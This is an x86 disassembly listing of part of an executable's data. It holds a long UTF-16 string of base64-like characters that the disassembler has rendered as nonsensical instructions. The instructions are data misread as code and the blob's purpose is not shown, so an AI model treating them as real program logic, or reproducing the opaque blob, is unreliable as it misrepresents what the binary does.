  40a467:	00 49 00             	add    %cl,0x0(%ecx)
  40a46a:	70 00                	jo     0x40a46c
  40a46c:	63 00                	arpl   %eax,(%eax)
  40a46e:	36 00 59 00          	add    %bl,%ss:0x0(%ecx)
  40a472:	59                   	pop    %ecx
  40a473:	00 46 00             	add    %al,0x0(%esi)
  40a476:	67 00 49 00          	add    %cl,0x0(%bx,%di)
  40a47a:	41                   	inc    %ecx
  40a47b:	00 59 00             	add    %bl,0x0(%ecx)
  40a47e:	65 00 79 00          	add    %bh,%gs:0x0(%ecx)
  40a482:	62 00                	bound  %eax,(%eax)
  40a484:	4e                   	dec    %esi
  40a485:	00 69 00             	add    %ch,0x0(%ecx)
  40a488:	79 00                	jns    0x40a48a
  40a48a:	6f                   	outsl  %ds:(%esi),(%dx)
  40a48b:	00 55 00             	add    %dl,0x0(%ebp)
  40a48e:	43                   	inc    %ebx
  40a48f:	00 72 00             	add    %dh,0x0(%edx)
  40a492:	77 00                	ja     0x40a494
  40a494:	32 00                	xor    (%eax),%al
  40a496:	62 00                	bound  %eax,(%eax)
  40a498:	2b 00                	sub    (%eax),%eax
  40a49a:	63 00                	arpl   %eax,(%eax)
  40a49c:	6b 00 68             	imul   $0x68,(%eax),%eax
  40a49f:	00 78 00             	add    %bh,0x0(%eax)
  40a4a2:	71 00                	jno    0x40a4a4
  40a4a4:	4e                   	dec    %esi
  40a4a5:	00 70 00             	add    %dh,0x0(%eax)
  40a4a8:	59                   	pop    %ecx
  40a4a9:	00 36                	add    %dh,(%esi)
  40a4ab:	00 66 00             	add    %ah,0x0(%esi)
  40a4ae:	31 00                	xor    %eax,(%eax)
  40a4b0:	76 00                	jbe    0x40a4b2
  40a4b2:	4b                   	dec    %ebx
  40a4b3:	00 4e 00             	add    %cl,0x0(%esi)
  40a4b6:	4f                   	dec    %edi
  40a4b7:	00 42 00             	add    %al,0x0(%edx)
  40a4ba:	54                   	push   %esp
  40a4bb:	00 49 00             	add    %cl,0x0(%ecx)
  40a4be:	58                   	pop    %eax
  40a4bf:	00 74 00 49          	add    %dh,0x49(%eax,%eax,1)
  40a4c3:	00 43 00             	add    %al,0x0(%ebx)
  40a4c6:	34 00                	xor    $0x0,%al
  40a4c8:	57                   	push   %edi
  40a4c9:	00 6a 00             	add    %ch,0x0(%edx)
  40a4cc:	36 00 7a 00          	add    %bh,%ss:0x0(%edx)
  40a4d0:	7a 00                	jp     0x40a4d2
  40a4d2:	54                   	push   %esp
  40a4d3:	00 58 00             	add    %bl,0x0(%eax)
  40a4d6:	50                   	push   %eax
  40a4d7:	00 47 00             	add    %al,0x0(%edi)
  40a4da:	37                   	aaa
  40a4db:	00 4d 00             	add    %cl,0x0(%ebp)
  40a4de:	5a                   	pop    %edx
  40a4df:	00 61 00             	add    %ah,0x0(%ecx)
  40a4e2:	46                   	inc    %esi
  40a4e3:	00 4c 00 4e          	add    %cl,0x4e(%eax,%eax,1)
  40a4e7:	00 44 00 6d          	add    %al,0x6d(%eax,%eax,1)
  40a4eb:	00 69 00             	add    %ch,0x0(%ecx)
  40a4ee:	35 00 48 00 79       	xor    $0x79004800,%eax
  40a4f3:	00 71 00             	add    %dh,0x0(%ecx)
  40a4f6:	5a                   	pop    %edx
  40a4f7:	00 7a 00             	add    %bh,0x0(%edx)
  40a4fa:	75 00                	jne    0x40a4fc
  40a4fc:	47                   	inc    %edi
  40a4fd:	00 64 00 32          	add    %ah,0x32(%eax,%eax,1)
  40a501:	00 2b                	add    %ch,(%ebx)
  40a503:	00 71 00             	add    %dh,0x0(%ecx)
  40a506:	55                   	push   %ebp
  40a507:	00 4f 00             	add    %cl,0x0(%edi)
  40a50a:	78 00                	js     0x40a50c
  40a50c:	38 00                	cmp    %al,(%eax)
  40a50e:	4e                   	dec    %esi
  40a50f:	00 4d 00             	add    %cl,0x0(%ebp)
  40a512:	35 00 67 00 6b       	xor    $0x6b006700,%eax
  40a517:	00 6d 00             	add    %ch,0x0(%ebp)
  40a51a:	72 00                	jb     0x40a51c
  40a51c:	56                   	push   %esi
  40a51d:	00 66 00             	add    %ah,0x0(%esi)
  40a520:	36 00 45 00          	add    %al,%ss:0x0(%ebp)
  40a524:	33 00                	xor    (%eax),%eax
  40a526:	64 00 48 00          	add    %cl,%fs:0x0(%eax)
  40a52a:	53                   	push   %ebx
  40a52b:	00 6e 00             	add    %ch,0x0(%esi)
  40a52e:	5a                   	pop    %edx
  40a52f:	00 77 00             	add    %dh,0x0(%edi)
  40a532:	59                   	pop    %ecx
  40a533:	00 78 00             	add    %bh,0x0(%eax)
  40a536:	74 00                	je     0x40a538
  40a538:	77 00                	ja     0x40a53a
  40a53a:	4e                   	dec    %esi
  40a53b:	00 34 00             	add    %dh,(%eax,%eax,1)
  40a53e:	50                   	push   %eax
  40a53f:	00 68 00             	add    %ch,0x0(%eax)
  40a542:	30 00                	xor    %al,(%eax)
  40a544:	68 00 51 00 36       	push   $0x36005100
  40a549:	00 37                	add    %dh,(%edi)
  40a54b:	00 6f 00             	add    %ch,0x0(%edi)
  40a54e:	2f                   	das
  40a54f:	00 67 00             	add    %ah,0x0(%edi)
  40a552:	67 00 67 00          	add    %ah,0x0(%bx)
  40a556:	30 00                	xor    %al,(%eax)
  40a558:	76 00                	jbe    0x40a55a
  40a55a:	42                   	inc    %edx
  40a55b:	00 54 00 49          	add    %dl,0x49(%eax,%eax,1)
  40a55f:	00 41 00             	add    %al,0x0(%ecx)
  40a562:	4c                   	dec    %esp
  40a563:	00 51 00             	add    %dl,0x0(%ecx)
  40a566:	63 00                	arpl   %eax,(%eax)
  40a568:	65 00 5a 00          	add    %bl,%gs:0x0(%edx)
  40a56c:	6b 00 31             	imul   $0x31,(%eax),%eax
  40a56f:	00 52 00             	add    %dl,0x0(%edx)
  40a572:	2b 00                	sub    (%eax),%eax
  40a574:	42                   	inc    %edx
  40a575:	00 72 00             	add    %dh,0x0(%edx)
  40a578:	57                   	push   %edi
  40a579:	00 34 00             	add    %dh,(%eax,%eax,1)
  40a57c:	56                   	push   %esi
  40a57d:	00 43 00             	add    %al,0x0(%ebx)
  40a580:	67 00 74 00          	add    %dh,0x0(%si)
  40a584:	6a 00                	push   $0x0
  40a586:	6e                   	outsb  %ds:(%esi),(%dx)
  40a587:	00 2f                	add    %ch,(%edi)
  40a589:	00 54 00 38          	add    %dl,0x38(%eax,%eax,1)
  40a58d:	00 47 00             	add    %al,0x0(%edi)
  40a590:	45                   	inc    %ebp
  40a591:	00 4b 00             	add    %cl,0x0(%ebx)
  40a594:	33 00                	xor    (%eax),%eax
  40a596:	77 00                	ja     0x40a598
  40a598:	2b 00                	sub    (%eax),%eax
  40a59a:	4e                   	dec    %esi
  40a59b:	00 77 00             	add    %dh,0x0(%edi)
  40a59e:	38 00                	cmp    %al,(%eax)
  40a5a0:	4c                   	dec    %esp
  40a5a1:	00 72 00             	add    %dh,0x0(%edx)
  40a5a4:	42                   	inc    %edx
  40a5a5:	00 51 00             	add    %dl,0x0(%ecx)
  40a5a8:	32 00                	xor    (%eax),%al
  40a5aa:	6f                   	outsl  %ds:(%esi),(%dx)
  40a5ab:	00 76 00             	add    %dh,0x0(%esi)
  40a5ae:	36 00 35 00 76 00 33 	add    %dh,%ss:0x33007600
  40a5b5:	00 42 00             	add    %al,0x0(%edx)
  40a5b8:	50                   	push   %eax
  40a5b9:	00 72 00             	add    %dh,0x0(%edx)
  40a5bc:	47                   	inc    %edi
  40a5bd:	00 75 00             	add    %dh,0x0(%ebp)
  40a5c0:	37                   	aaa
  40a5c1:	00 79 00             	add    %bh,0x0(%ecx)
  40a5c4:	66 00 53 00          	data16 add %dl,0x0(%ebx)
  40a5c8:	58                   	pop    %eax
  40a5c9:	00 4f 00             	add    %cl,0x0(%edi)
  40a5cc:	5a                   	pop    %edx
  40a5cd:	00 44 00 50          	add    %al,0x50(%eax,%eax,1)
  40a5d1:	00 66 00             	add    %ah,0x0(%esi)
  40a5d4:	53                   	push   %ebx
  40a5d5:	00 50 00             	add    %dl,0x0(%eax)
  40a5d8:	54                   	push   %esp
  40a5d9:	00 79 00             	add    %bh,0x0(%ecx)
  40a5dc:	64 00 4f 00          	add    %cl,%fs:0x0(%edi)
  40a5e0:	44                   	inc    %esp
  40a5e1:	00 71 00             	add    %dh,0x0(%ecx)
  40a5e4:	47                   	inc    %edi
  40a5e5:	00 2f                	add    %ch,(%edi)
  40a5e7:	00 44 00 32          	add    %al,0x32(%eax,%eax,1)
  40a5eb:	00 6c 00 2b          	add    %ch,0x2b(%eax,%eax,1)
  40a5ef:	00 72 00             	add    %dh,0x0(%edx)
  40a5f2:	42                   	inc    %edx
  40a5f3:	00 43 00             	add    %al,0x0(%ebx)
  40a5f6:	48                   	dec    %eax
  40a5f7:	00 6a 00             	add    %ch,0x0(%edx)
  40a5fa:	70 00                	jo     0x40a5fc
  40a5fc:	2b 00                	sub    (%eax),%eax
  40a5fe:	45                   	inc    %ebp
  40a5ff:	00 71 00             	add    %dh,0x0(%ecx)
  40a602:	59                   	pop    %ecx
  40a603:	00 61 00             	add    %ah,0x0(%ecx)
  40a606:	55                   	push   %ebp
  40a607:	00 49 00             	add    %cl,0x0(%ecx)
  40a60a:	52                   	push   %edx
  40a60b:	00 38                	add    %bh,(%eax)
  40a60d:	00 67 00             	add    %ah,0x0(%edi)
  40a610:	52                   	push   %edx
  40a611:	00 2f                	add    %ch,(%edi)
  40a613:	00 49 00             	add    %cl,0x0(%ecx)
  40a616:	4b                   	dec    %ebx
  40a617:	00 34 00             	add    %dh,(%eax,%eax,1)
  40a61a:	66 00 43 00          	data16 add %al,0x0(%ebx)
  40a61e:	45                   	inc    %ebp
  40a61f:	00 61 00             	add    %ah,0x0(%ecx)
  40a622:	61                   	popa
  40a623:	00 4a 00             	add    %cl,0x0(%edx)
  40a626:	49                   	dec    %ecx
  40a627:	00 69 00             	add    %ch,0x0(%ecx)
  40a62a:	53                   	push   %ebx
  40a62b:	00 46 00             	add    %al,0x0(%esi)
  40a62e:	78 00                	js     0x40a630
  40a630:	41                   	inc    %ecx
  40a631:	00 4c 00 69          	add    %cl,0x69(%eax,%eax,1)
  40a635:	00 33                	add    %dh,(%ebx)
  40a637:	00 33                	add    %dh,(%ebx)
  40a639:	00 73 00             	add    %dh,0x0(%ebx)
  40a63c:	69 00 31 00 63 00    	imul   $0x630031,(%eax),%eax
  40a642:	63 00                	arpl   %eax,(%eax)
  40a644:	56                   	push   %esi
  40a645:	00 58 00             	add    %bl,0x0(%eax)
  40a648:	6c                   	insb   (%dx),%es:(%edi)
  40a649:	00 70 00             	add    %dh,0x0(%eax)
  40a64c:	6e                   	outsb  %ds:(%esi),(%dx)
  40a64d:	00 75 00             	add    %dh,0x0(%ebp)
  40a650:	42                   	inc    %edx
  40a651:	00 48 00             	add    %cl,0x0(%eax)
  40a654:	61                   	popa
  40a655:	00 32                	add    %dh,(%edx)
  40a657:	00 48 00             	add    %cl,0x0(%eax)
  40a65a:	30 00                	xor    %al,(%eax)
  40a65c:	55                   	push   %ebp
  40a65d:	00 4c 00 5a          	add    %cl,0x5a(%eax,%eax,1)
  40a661:	00 31                	add    %dh,(%ecx)
  40a663:	00 49 00             	add    %cl,0x0(%ecx)
  40a666:	65 00 54 00 2f       	add    %dl,%gs:0x2f(%eax,%eax,1)
  40a66b:	00 6f 00             	add    %ch,0x0(%edi)
  40a66e:	6a 00                	push   $0x0
  40a670:	57                   	push   %edi
  40a671:	00 55 00             	add    %dl,0x0(%ebp)
  40a674:	46                   	inc    %esi
  40a675:	00 36                	add    %dh,(%esi)
  40a677:	00 5a 00             	add    %bl,0x0(%edx)
  40a67a:	45                   	inc    %ebp
  40a67b:	00 77 00             	add    %dh,0x0(%edi)
  40a67e:	61                   	popa
  40a67f:	00 6f 00             	add    %ch,0x0(%edi)
  40a682:	75 00                	jne    0x40a684
  40a684:	54                   	push   %esp
  40a685:	00 72 00             	add    %dh,0x0(%edx)
  40a688:	4b                   	dec    %ebx
  40a689:	00 49 00             	add    %cl,0x0(%ecx)
  40a68c:	59                   	pop    %ecx
  40a68d:	00 4d 00             	add    %cl,0x0(%ebp)
  40a690:	57                   	push   %edi
  40a691:	00 6a 00             	add    %ch,0x0(%edx)
  40a694:	31 00                	xor    %eax,(%eax)
  40a696:	39 00                	cmp    %eax,(%eax)
  40a698:	45                   	inc    %ebp
  40a699:	00 73 00             	add    %dh,0x0(%ebx)
  40a69c:	48                   	dec    %eax
  40a69d:	00 41 00             	add    %al,0x0(%ecx)
  40a6a0:	70 00                	jo     0x40a6a2
  40a6a2:	37                   	aaa
  40a6a3:	00 4f 00             	add    %cl,0x0(%edi)
  40a6a6:	30 00                	xor    %al,(%eax)
  40a6a8:	79 00                	jns    0x40a6aa
  40a6aa:	79 00                	jns    0x40a6ac
  40a6ac:	48                   	dec    %eax
  40a6ad:	00 51 00             	add    %dl,0x0(%ecx)
  40a6b0:	61                   	popa
  40a6b1:	00 6f 00             	add    %ch,0x0(%edi)
  40a6b4:	37                   	aaa
  40a6b5:	00 61 00             	add    %ah,0x0(%ecx)
  40a6b8:	30 00                	xor    %al,(%eax)
  40a6ba:	37                   	aaa
  40a6bb:	00 4f 00             	add    %cl,0x0(%edi)
  40a6be:	38 00                	cmp    %al,(%eax)
  40a6c0:	4a                   	dec    %edx
  40a6c1:	00 55 00             	add    %dl,0x0(%ebp)
  40a6c4:	37                   	aaa
  40a6c5:	00 6c 00 70          	add    %ch,0x70(%eax,%eax,1)
  40a6c9:	00 43 00             	add    %al,0x0(%ebx)
  40a6cc:	52                   	push   %edx
  40a6cd:	00 5a 00             	add    %bl,0x0(%edx)
  40a6d0:	51                   	push   %ecx
  40a6d1:	00 48 00             	add    %cl,0x0(%eax)
  40a6d4:	44                   	inc    %esp
  40a6d5:	00 72 00             	add    %dh,0x0(%edx)
  40a6d8:	7a 00                	jp     0x40a6da
  40a6da:	76 00                	jbe    0x40a6dc
  40a6dc:	77 00                	ja     0x40a6de
  40a6de:	34 00                	xor    $0x0,%al
  40a6e0:	41                   	inc    %ecx
  40a6e1:	00 4f 00             	add    %cl,0x0(%edi)
  40a6e4:	6e                   	outsb  %ds:(%esi),(%dx)
  40a6e5:	00 62 00             	add    %ah,0x0(%edx)
  40a6e8:	4d                   	dec    %ebp
  40a6e9:	00 74 00 67          	add    %dh,0x67(%eax,%eax,1)
  40a6ed:	00 6d 00             	add    %ch,0x0(%ebp)
  40a6f0:	4b                   	dec    %ebx
  40a6f1:	00 34 00             	add    %dh,(%eax,%eax,1)
  40a6f4:	66 00 63 00          	data16 add %ah,0x0(%ebx)
  40a6f8:	2f                   	das
  40a6f9:	00 4d 00             	add    %cl,0x0(%ebp)
  40a6fc:	2b 00                	sub    (%eax),%eax
  40a6fe:	4c                   	dec    %esp
  40a6ff:	00 6d 00             	add    %ch,0x0(%ebp)
  40a702:	75 00                	jne    0x40a704
  40a704:	64 00 31             	add    %dh,%fs:(%ecx)
  40a707:	00 39                	add    %bh,(%ecx)
  40a709:	00 52 00             	add    %dl,0x0(%edx)
  40a70c:	32 00                	xor    (%eax),%al
  40a70e:	4f                   	dec    %edi
  40a70f:	00 77 00             	add    %dh,0x0(%edi)
  40a712:	56                   	push   %esi
  40a713:	00 30                	add    %dh,(%eax)
  40a715:	00 76 00             	add    %dh,0x0(%esi)
  40a718:	59                   	pop    %ecx
  40a719:	00 4e 00             	add    %cl,0x0(%esi)
  40a71c:	58                   	pop    %eax
  40a71d:	00 43 00             	add    %al,0x0(%ebx)
  40a720:	47                   	inc    %edi
  40a721:	00 73 00             	add    %dh,0x0(%ebx)
  40a724:	56                   	push   %esi
  40a725:	00 77 00             	add    %dh,0x0(%edi)
  40a728:	77 00                	ja     0x40a72a
  40a72a:	62 00                	bound  %eax,(%eax)
  40a72c:	30 00                	xor    %al,(%eax)
  40a72e:	72 00                	jb     0x40a730
  40a730:	52                   	push   %edx
  40a731:	00 50 00             	add    %dl,0x0(%eax)
  40a734:	6f                   	outsl  %ds:(%esi),(%dx)
  40a735:	00 76 00             	add    %dh,0x0(%esi)
  40a738:	4d                   	dec    %ebp
  40a739:	00 44 00 6c          	add    %al,0x6c(%eax,%eax,1)
  40a73d:	00 71 00             	add    %dh,0x0(%ecx)
  40a740:	4d                   	dec    %ebp
  40a741:	00 4d 00             	add    %cl,0x0(%ebp)
  40a744:	45                   	inc    %ebp
  40a745:	00 33                	add    %dh,(%ebx)
  40a747:	00 57 00             	add    %dl,0x0(%edi)
  40a74a:	73 00                	jae    0x40a74c
  40a74c:	36 00 78 00          	add    %bh,%ss:0x0(%eax)
  40a750:	61                   	popa
  40a751:	00 37                	add    %dh,(%edi)
  40a753:	00 45 00             	add    %al,0x0(%ebp)
  40a756:	75 00                	jne    0x40a758
  40a758:	6e                   	outsb  %ds:(%esi),(%dx)
  40a759:	00 62 00             	add    %ah,0x0(%edx)
  40a75c:	64 00 2f             	add    %ch,%fs:(%edi)
  40a75f:	00 4c 00 5a          	add    %cl,0x5a(%eax,%eax,1)
  40a763:	00 73 00             	add    %dh,0x0(%ebx)
  40a766:	4d                   	dec    %ebp
  40a767:	00 56 00             	add    %dl,0x0(%esi)
  40a76a:	67 00 6f 00          	add    %ch,0x0(%bx)
  40a76e:	38 00                	cmp    %al,(%eax)
  40a770:	79 00                	jns    0x40a772
  40a772:	43                   	inc    %ebx
  40a773:	00 61 00             	add    %ah,0x0(%ecx)
  40a776:	36 00 73 00          	add    %dh,%ss:0x0(%ebx)
  40a77a:	52                   	push   %edx
  40a77b:	00 74 00 4b          	add    %dh,0x4b(%eax,%eax,1)
  40a77f:	00 64 00 5a          	add    %ah,0x5a(%eax,%eax,1)
  40a783:	00 78 00             	add    %bh,0x0(%eax)
  40a786:	5a                   	pop    %edx
  40a787:	00 33                	add    %dh,(%ebx)
  40a789:	00 62 00             	add    %ah,0x0(%edx)
  40a78c:	65 00 6e 00          	add    %ch,%gs:0x0(%esi)
  40a790:	69 00 50 00 71 00    	imul   $0x710050,(%eax),%eax
  40a796:	61                   	popa
  40a797:	00 32                	add    %dh,(%edx)
  40a799:	00 43 00             	add    %al,0x0(%ebx)
  40a79c:	43                   	inc    %ebx
  40a79d:	00 6e 00             	add    %ch,0x0(%esi)
  40a7a0:	68 00 71 00 38       	push   $0x38007100
  40a7a5:	00 77 00             	add    %dh,0x0(%edi)
  40a7a8:	51                   	push   %ecx
  40a7a9:	00 39                	add    %bh,(%ecx)
  40a7ab:	00 72 00             	add    %dh,0x0(%edx)
  40a7ae:	51                   	push   %ecx
  40a7af:	00 54 00 52          	add    %dl,0x52(%eax,%eax,1)
  40a7b3:	00 54 00 79          	add    %dl,0x79(%eax,%eax,1)
  40a7b7:	00 47 00             	add    %al,0x0(%edi)
  40a7ba:	35 00 2b 00 51       	xor    $0x51002b00,%eax
  40a7bf:	00 61 00             	add    %ah,0x0(%ecx)
  40a7c2:	44                   	inc    %esp
  40a7c3:	00 55 00             	add    %dl,0x0(%ebp)
  40a7c6:	68 00 67 00 5a       	push   $0x5a006700
  40a7cb:	00 4a 00             	add    %cl,0x0(%edx)
  40a7ce:	70 00                	jo     0x40a7d0
  40a7d0:	48                   	dec    %eax
  40a7d1:	00 6d 00             	add    %ch,0x0(%ebp)
  40a7d4:	38 00                	cmp    %al,(%eax)
  40a7d6:	6d                   	insl   (%dx),%es:(%edi)
  40a7d7:	00 33                	add    %dh,(%ebx)
  40a7d9:	00 34 00             	add    %dh,(%eax,%eax,1)
  40a7dc:	31 00                	xor    %eax,(%eax)
  40a7de:	73 00                	jae    0x40a7e0
  40a7e0:	50                   	push   %eax
  40a7e1:	00 37                	add    %dh,(%edi)
  40a7e3:	00 39                	add    %bh,(%ecx)
  40a7e5:	00 33                	add    %dh,(%ebx)
  40a7e7:	00 2b                	add    %ch,(%ebx)
  40a7e9:	00 4b 00             	add    %cl,0x0(%ebx)
  40a7ec:	79 00                	jns    0x40a7ee
  40a7ee:	54                   	push   %esp
  40a7ef:	00 76 00             	add    %dh,0x0(%esi)
  40a7f2:	75 00                	jne    0x40a7f4
  40a7f4:	31 00                	xor    %eax,(%eax)
  40a7f6:	43                   	inc    %ebx
  40a7f7:	00 70 00             	add    %dh,0x0(%eax)
  40a7fa:	51                   	push   %ecx
  40a7fb:	00 4f 00             	add    %cl,0x0(%edi)
  40a7fe:	46                   	inc    %esi
  40a7ff:	00 52 00             	add    %dl,0x0(%edx)
  40a802:	64 00 51 00          	add    %dl,%fs:0x0(%ecx)
  40a806:	35 00 2b 00 68       	xor    $0x68002b00,%eax
  40a80b:	00 47 00             	add    %al,0x0(%edi)
  40a80e:	56                   	push   %esi
  40a80f:	00 46 00             	add    %al,0x0(%esi)
  40a812:	59                   	pop    %ecx
  40a813:	00 4a 00             	add    %cl,0x0(%edx)
  40a816:	52                   	push   %edx
  40a817:	00 68 00             	add    %ch,0x0(%eax)
  40a81a:	47                   	inc    %edi
  40a81b:	00 30                	add    %dh,(%eax)
  40a81d:	00 44 00 38          	add    %al,0x38(%eax,%eax,1)
  40a821:	00 4a 00             	add    %cl,0x0(%edx)
  40a824:	45                   	inc    %ebp
  40a825:	00 56 00             	add    %dl,0x0(%esi)
  40a828:	58                   	pop    %eax
  40a829:	00 45 00             	add    %al,0x0(%ebp)
  40a82c:	64 00 7a 00          	add    %bh,%fs:0x0(%edx)
  40a830:	73 00                	jae    0x40a832
  40a832:	48                   	dec    %eax
  40a833:	00 64 00 2b          	add    %ah,0x2b(%eax,%eax,1)
  40a837:	00 4a 00             	add    %cl,0x0(%edx)
  40a83a:	4c                   	dec    %esp
  40a83b:	00 70 00             	add    %dh,0x0(%eax)
  40a83e:	52                   	push   %edx
  40a83f:	00 66 00             	add    %ah,0x0(%esi)
  40a842:	7a 00                	jp     0x40a844
  40a844:	6d                   	insl   (%dx),%es:(%edi)
  40a845:	00 52 00             	add    %dl,0x0(%edx)
  40a848:	56                   	push   %esi
  40a849:	00 58 00             	add    %bl,0x0(%eax)
  40a84c:	50                   	push   %eax
  40a84d:	00 69 00             	add    %ch,0x0(%ecx)
  40a850:	66 00 4a 00          	data16 add %cl,0x0(%edx)
  40a854:	57                   	push   %edi
  40a855:	00 64 00 4c          	add    %ah,0x4c(%eax,%eax,1)
  40a859:	00 53 00             	add    %dl,0x0(%ebx)
  40a85c:	69 00 50 00 55 00    	imul   $0x550050,(%eax),%eax
  40a862:	37                   	aaa
  40a863:	00 73 00             	add    %dh,0x0(%ebx)
  40a866:	6c                   	insb   (%dx),%es:(%edi)
  40a867:	00 48 00             	add    %cl,0x0(%eax)
  40a86a:	76 00                	jbe    0x40a86c
  40a86c:	76 00                	jbe    0x40a86e
  40a86e:	34 00                	xor    $0x0,%al
  40a870:	39 00                	cmp    %eax,(%eax)
  40a872:	33 00                	xor    (%eax),%eax
  40a874:	51                   	push   %ecx
  40a875:	00 2f                	add    %ch,(%edi)
  40a877:	00 6f 00             	add    %ch,0x0(%edi)
  40a87a:	63 00                	arpl   %eax,(%eax)
  40a87c:	45                   	inc    %ebp
  40a87d:	00 42 00             	add    %al,0x0(%edx)
  40a880:	61                   	popa
  40a881:	00 49 00             	add    %cl,0x0(%ecx)
  40a884:	45                   	inc    %ebp
  40a885:	00 39                	add    %bh,(%ecx)
  40a887:	00 74 00 42          	add    %dh,0x42(%eax,%eax,1)
  40a88b:	00 2b                	add    %ch,(%ebx)
  40a88d:	00 73 00             	add    %dh,0x0(%ebx)
  40a890:	6c                   	insb   (%dx),%es:(%edi)
  40a891:	00 7a 00             	add    %bh,0x0(%edx)
  40a894:	66 00 47 00          	data16 add %al,0x0(%edi)
  40a898:	77 00                	ja     0x40a89a
  40a89a:	75 00                	jne    0x40a89c
  40a89c:	4a                   	dec    %edx
  40a89d:	00 5a 00             	add    %bl,0x0(%edx)
  40a8a0:	71 00                	jno    0x40a8a2
  40a8a2:	33 00                	xor    (%eax),%eax
  40a8a4:	54                   	push   %esp
  40a8a5:	00 38                	add    %bh,(%eax)
  40a8a7:	00 5a 00             	add    %bl,0x0(%edx)
  40a8aa:	34 00                	xor    $0x0,%al
  40a8ac:	45                   	inc    %ebp
  40a8ad:	00 70 00             	add    %dh,0x0(%eax)
  40a8b0:	7a 00                	jp     0x40a8b2
  40a8b2:	39 00                	cmp    %eax,(%eax)
  40a8b4:	52                   	push   %edx
  40a8b5:	00 78 00             	add    %bh,0x0(%eax)
  40a8b8:	6b 00 39             	imul   $0x39,(%eax),%eax
  40a8bb:	00 6a 00             	add    %ch,0x0(%edx)
  40a8be:	69 00 6f 00 32 00    	imul   $0x32006f,(%eax),%eax
  40a8c4:	72 00                	jb     0x40a8c6
  40a8c6:	76 00                	jbe    0x40a8c8
  40a8c8:	33 00                	xor    (%eax),%eax
  40a8ca:	67 00 32             	add    %dh,(%bp,%si)
  40a8cd:	00 48 00             	add    %cl,0x0(%eax)
  40a8d0:	51                   	push   %ecx
  40a8d1:	00 43 00             	add    %al,0x0(%ebx)
  40a8d4:	2f                   	das
  40a8d5:	00 6c 00 56          	add    %ch,0x56(%eax,%eax,1)
  40a8d9:	00 61 00             	add    %ah,0x0(%ecx)
  40a8dc:	69 00 56 00 47 00    	imul   $0x470056,(%eax),%eax
  40a8e2:	45                   	inc    %ebp
  40a8e3:	00 78 00             	add    %bh,0x0(%eax)
  40a8e6:	77 00                	ja     0x40a8e8
  40a8e8:	37                   	aaa
  40a8e9:	00 32                	add    %dh,(%edx)
  40a8eb:	00 68 00             	add    %ch,0x0(%eax)
  40a8ee:	63 00                	arpl   %eax,(%eax)
  40a8f0:	6e                   	outsb  %ds:(%esi),(%dx)
  40a8f1:	00 76 00             	add    %dh,0x0(%esi)
  40a8f4:	34 00                	xor    $0x0,%al
  40a8f6:	55                   	push   %ebp
  40a8f7:	00 47 00             	add    %al,0x0(%edi)
  40a8fa:	77 00                	ja     0x40a8fc
  40a8fc:	4b                   	dec    %ebx
  40a8fd:	00 51 00             	add    %dl,0x0(%ecx)
  40a900:	71 00                	jno    0x40a902
  40a902:	30 00                	xor    %al,(%eax)
  40a904:	33 00                	xor    (%eax),%eax
  40a906:	53                   	push   %ebx
  40a907:	00 6c 00 57          	add    %ch,0x57(%eax,%eax,1)
  40a90b:	00 45 00             	add    %al,0x0(%ebp)
  40a90e:	32 00                	xor    (%eax),%al
  40a910:	74 00                	je     0x40a912
  40a912:	72 00                	jb     0x40a914
  40a914:	71 00                	jno    0x40a916
  40a916:	58                   	pop    %eax
  40a917:	00 70 00             	add    %dh,0x0(%eax)
  40a91a:	6d                   	insl   (%dx),%es:(%edi)
  40a91b:	00 45 00             	add    %al,0x0(%ebp)
  40a91e:	31 00                	xor    %eax,(%eax)
  40a920:	74 00                	je     0x40a922
  40a922:	69 00 63 00 72 00    	imul   $0x720063,(%eax),%eax
  40a928:	6e                   	outsb  %ds:(%esi),(%dx)
  40a929:	00 72 00             	add    %dh,0x0(%edx)
  40a92c:	64 00 79 00          	add    %bh,%fs:0x0(%ecx)
  40a930:	64 00 7a 00          	add    %bh,%fs:0x0(%edx)
  40a934:	57                   	push   %edi
  40a935:	00 5a 00             	add    %bl,0x0(%edx)
  40a938:	52                   	push   %edx
  40a939:	00 79 00             	add    %bh,0x0(%ecx)
  40a93c:	31 00                	xor    %eax,(%eax)
  40a93e:	5a                   	pop    %edx
  40a93f:	00 6a 00             	add    %ch,0x0(%edx)
  40a942:	73 00                	jae    0x40a944
  40a944:	79 00                	jns    0x40a946
  40a946:	76 00                	jbe    0x40a948
  40a948:	6f                   	outsl  %ds:(%esi),(%dx)
  40a949:	00 38                	add    %bh,(%eax)
  40a94b:	00 35 00 61 00 38    	add    %dh,0x38006100
  40a951:	00 71 00             	add    %dh,0x0(%ecx)
  40a954:	50                   	push   %eax
  40a955:	00 2b                	add    %ch,(%ebx)
  40a957:	00 52 00             	add    %dl,0x0(%edx)
  40a95a:	7a 00                	jp     0x40a95c
  40a95c:	50                   	push   %eax
  40a95d:	00 66 00             	add    %ah,0x0(%esi)
  40a960:	6e                   	outsb  %ds:(%esi),(%dx)
  40a961:	00 6f 00             	add    %ch,0x0(%edi)
  40a964:	45                   	inc    %ebp
  40a965:	00 75 00             	add    %dh,0x0(%ebp)
  40a968:	76 00                	jbe    0x40a96a
  40a96a:	50                   	push   %eax
  40a96b:	00 6c 00 54          	add    %ch,0x54(%eax,%eax,1)
  40a96f:	00 6a 00             	add    %ch,0x0(%edx)
  40a972:	65 00 65 00          	add    %ah,%gs:0x0(%ebp)
  40a976:	63 00                	arpl   %eax,(%eax)
  40a978:	6f                   	outsl  %ds:(%esi),(%dx)
  40a979:	00 6f 00             	add    %ch,0x0(%edi)
  40a97c:	64 00 57 00          	add    %dl,%fs:0x0(%edi)
  40a980:	62 00                	bound  %eax,(%eax)
  40a982:	2b 00                	sub    (%eax),%eax
  40a984:	6e                   	outsb  %ds:(%esi),(%dx)
  40a985:	00 59 00             	add    %bl,0x0(%ecx)
  40a988:	49                   	dec    %ecx
  40a989:	00 6e 00             	add    %ch,0x0(%esi)
  40a98c:	71 00                	jno    0x40a98e
  40a98e:	73 00                	jae    0x40a990
  40a990:	65 00 57 00          	add    %dl,%gs:0x0(%edi)
  40a994:	74 00                	je     0x40a996
  40a996:	71 00                	jno    0x40a998
  40a998:	79 00                	jns    0x40a99a
  40a99a:	2f                   	das
  40a99b:	00 77 00             	add    %dh,0x0(%edi)
  40a99e:	74 00                	je     0x40a9a0
  40a9a0:	66 00 74 00 71       	data16 add %dh,0x71(%eax,%eax,1)
  40a9a5:	00 36                	add    %dh,(%esi)
  40a9a7:	00 45 00             	add    %al,0x0(%ebp)
  40a9aa:	37                   	aaa
  40a9ab:	00 61 00             	add    %ah,0x0(%ecx)
  40a9ae:	73 00                	jae    0x40a9b0
